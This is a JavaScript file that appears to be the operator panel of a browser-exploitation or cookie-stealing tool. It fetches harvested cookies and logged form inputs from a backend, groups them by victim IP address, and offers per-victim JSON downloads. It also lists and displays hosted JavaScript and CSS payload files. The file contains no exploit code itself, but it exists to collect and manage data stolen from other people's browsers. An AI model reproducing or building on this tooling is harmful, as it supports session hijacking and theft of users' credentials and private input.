function showSection(sectionId) {
    const sections = document.querySelectorAll('.main-content');
    sections.forEach(section => {
        section.style.display = 'none';
    });

    const selectedSection = document.getElementById(sectionId);
    if (selectedSection) {
        selectedSection.style.display = 'block';
    }
}

function copyPath() {
    const path = window.location.pathname;
    navigator.clipboard.writeText(path).then(() => {
        const button = document.querySelector('.copy-button');
        button.textContent = 'Copied!';
        setTimeout(() => {
            button.textContent = 'Copy';
        }, 800);
    });
}

async function fetchCookies() {
    try {
        const response = await fetch('/ep/api/getCookies');
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const cookies = await response.json();
        populateCookies(cookies);
    } catch (error) {
        console.error(error);
    }
}

function populateCookies(cookies) {
    const cookieGrid = document.getElementById('cookie-grid');
    cookieGrid.innerHTML = '';

    const cookiesByIp = {};
    cookies.forEach(cookie => {
        if (!cookiesByIp[cookie.ip]) {
            cookiesByIp[cookie.ip] = [];
        }
        cookiesByIp[cookie.ip].push(cookie);
    });

    for (const ip in cookiesByIp) {
        const ipSection = document.createElement('div');
        ipSection.className = 'ip-section collapsed';

        const ipHeader = document.createElement('div');
        ipHeader.className = 'ip-header';
        const headerContent = document.createElement('div');
        headerContent.className = 'ip-header-content';
        headerContent.textContent = `IP: ${ip}`;
        const headerIcons = document.createElement('div');
        headerIcons.className = 'ip-header-icons';
        headerIcons.innerHTML = `
            <span class="expand-icon">▼</span>
            <a href="#" class="download-icon" onclick="downloadIpJson('${ip}', event)">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ff1f1f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
            </a>
        `;
        ipHeader.appendChild(headerContent);
        ipHeader.appendChild(headerIcons);
        ipHeader.onclick = (e) => {
            if (!e.target.closest('.download-icon')) {
                ipSection.classList.toggle('collapsed');
            }
        };
        ipSection.appendChild(ipHeader);

        const ipCookies = document.createElement('div');
        ipCookies.className = 'ip-cookies';

        cookiesByIp[ip].forEach(cookie => {
            const cookieCard = document.createElement('div');
            cookieCard.className = 'cookie-card';

            const cookieName = document.createElement('div');
            cookieName.className = 'cookie-name';
            cookieName.textContent = cookie.name;

            const cookieValue = document.createElement('div');
            cookieValue.className = 'cookie-value';
            cookieValue.textContent = cookie.value;

            const cookieTimestamp = document.createElement('div');
            cookieTimestamp.className = 'cookie-timestamp';
            cookieTimestamp.textContent = cookie.timestamp;

            cookieCard.appendChild(cookieName);
            cookieCard.appendChild(cookieValue);
            cookieCard.appendChild(cookieTimestamp);
            ipCookies.appendChild(cookieCard);
        });

        ipSection.appendChild(ipCookies);
        cookieGrid.appendChild(ipSection);
    }
}

function downloadIpJson(ip, event) {
    event.preventDefault();
    event.stopPropagation();
    
    const cookieGrid = document.getElementById('cookie-grid');
    const ipSections = cookieGrid.getElementsByClassName('ip-section');
    
    let ipCookies = [];
    for (const section of ipSections) {
        const headerContent = section.querySelector('.ip-header-content');
        const sectionIp = headerContent.textContent.replace('IP: ', '');
        
        if (sectionIp === ip) {
            const cookieCards = section.querySelectorAll('.cookie-card');
            cookieCards.forEach(card => {
                ipCookies.push({
                    key: card.querySelector('.cookie-name').textContent,
                    value: card.querySelector('.cookie-value').textContent,
                    timestamp: card.querySelector('.cookie-timestamp').textContent.replace('Logged: ', ''),
                    ip: ip
                });
            });
            break;
        }
    }

    const jsonString = JSON.stringify(ipCookies, null, 2);
    const blob = new Blob([jsonString], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `ip-${ip}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

async function fetchInputs() {
    try {
        const response = await fetch('/ep/api/getInputs');
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const inputs = await response.json();
        populateInputs(inputs);
    } catch (error) {
        console.error(error);
    }
}

function populateInputs(inputs) {
    const inputGrid = document.getElementById('inputlogger-grid');
    inputGrid.innerHTML = '';

    const inputsByIp = {};
    inputs.forEach(input => {
        if (!inputsByIp[input.ip]) {
            inputsByIp[input.ip] = [];
        }
        inputsByIp[input.ip].push(input);
    });

    for (const ip in inputsByIp) {
        const ipSection = document.createElement('div');
        ipSection.className = 'ip-section collapsed';

        const ipHeader = document.createElement('div');
        ipHeader.className = 'ip-header';
        const headerContent = document.createElement('div');
        headerContent.className = 'ip-header-content';
        headerContent.textContent = `IP: ${ip}`;
        const headerIcons = document.createElement('div');
        headerIcons.className = 'ip-header-icons';
        headerIcons.innerHTML = `
            <span class="expand-icon">▼</span>
            <a href="#" class="download-icon" onclick="downloadInputsJson('${ip}', event)">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ff1f1f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
            </a>
        `;
        ipHeader.appendChild(headerContent);
        ipHeader.appendChild(headerIcons);
        ipHeader.onclick = (e) => {
            if (!e.target.closest('.download-icon')) {
                ipSection.classList.toggle('collapsed');
            }
        };
        ipSection.appendChild(ipHeader);

        const ipInputs = document.createElement('div');
        ipInputs.className = 'ip-cookies';

        inputsByIp[ip].forEach(input => {
            const inputCard = document.createElement('div');
            inputCard.className = 'cookie-card';

            const inputName = document.createElement('div');
            inputName.className = 'cookie-name';
            inputName.textContent = input.name;

            const inputValue = document.createElement('div');
            inputValue.className = 'cookie-value';
            inputValue.textContent = input.value;

            const inputTimestamp = document.createElement('div');
            inputTimestamp.className = 'cookie-timestamp';
            inputTimestamp.textContent = input.timestamp;

            inputCard.appendChild(inputName);
            inputCard.appendChild(inputValue);
            inputCard.appendChild(inputTimestamp);
            ipInputs.appendChild(inputCard);
        });

        ipSection.appendChild(ipInputs);
        inputGrid.appendChild(ipSection);
    }
}

function downloadInputsJson(ip, event) {
    event.preventDefault();
    event.stopPropagation();
    const inputGrid = document.getElementById('inputlogger-grid');
    const ipSections = inputGrid.getElementsByClassName('ip-section');
    let ipInputs = [];
    for (const section of ipSections) {
        const headerContent = section.querySelector('.ip-header-content');
        const sectionIp = headerContent.textContent.replace('IP: ', '');
        if (sectionIp === ip) {
            const inputCards = section.querySelectorAll('.cookie-card');
            inputCards.forEach(card => {
                ipInputs.push({
                    key: card.querySelector('.cookie-name').textContent,
                    value: card.querySelector('.cookie-value').textContent,
                    timestamp: card.querySelector('.cookie-timestamp').textContent,
                    ip: ip
                });
            });
            break;
        }
    }

    const jsonString = JSON.stringify(ipInputs, null, 2);
    const blob = new Blob([jsonString], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `ip-${ip}-inputs.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

async function fetchPayloads() {
    try {
        const response = await fetch('/ep/api/getPayloads');
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const payloads = await response.json();
        populatePayloads(payloads);
    } catch (error) {
        console.error(error);
    }
}

function populatePayloads(payloads) {
    const payloadGrid = document.getElementById('payload-grid');
    payloadGrid.innerHTML = '';

    payloads.forEach(async (payload) => {
        const payloadSection = document.createElement('div');
        payloadSection.className = 'ip-section collapsed';

        const payloadHeader = document.createElement('div');
        payloadHeader.className = 'ip-header';
        const headerContent = document.createElement('div');
        headerContent.className = 'ip-header-content';
        headerContent.textContent = payload;
        const headerIcons = document.createElement('div');
        headerIcons.className = 'ip-header-icons';
        headerIcons.innerHTML = `
            <span class="expand-icon">▼</span>
            <a href="/${payload}" download class="download-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ff1f1f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
            </a>
        `;
        payloadHeader.appendChild(headerContent);
        payloadHeader.appendChild(headerIcons);
        payloadHeader.onclick = (e) => {
            if (!e.target.closest('.download-icon')) {
                payloadSection.classList.toggle('collapsed');
            }
        };
        payloadSection.appendChild(payloadHeader);

        const payloadContent = document.createElement('div');
        payloadContent.className = 'ip-cookies';

        try {
            const response = await fetch(`/${payload}`);
            if (!response.ok) {
                throw new Error();
            }
            const text = await response.text();
            const codeBlock = document.createElement('pre');
            const code = document.createElement('code');
            if (payload.endsWith('.js')){
                code.className = 'language-javascript';
            } else{
                code.className = 'language-css'
            }
            code.textContent = text;
            codeBlock.appendChild(code);
            payloadContent.appendChild(codeBlock);
            Prism.highlightElement(code);
        } catch (error) {
            payloadContent.innerHTML = '<span style="color:#5c5c5c;">Error loading payload content.<br>The file might be corrupt or deleted while the backend was running.</span>';
        }

        payloadSection.appendChild(payloadContent);
        payloadGrid.appendChild(payloadSection);
    });
}

showSection('home');
document.getElementById('current-path').textContent = window.location.pathname;
fetchCookies();
fetchPayloads();
fetchInputs();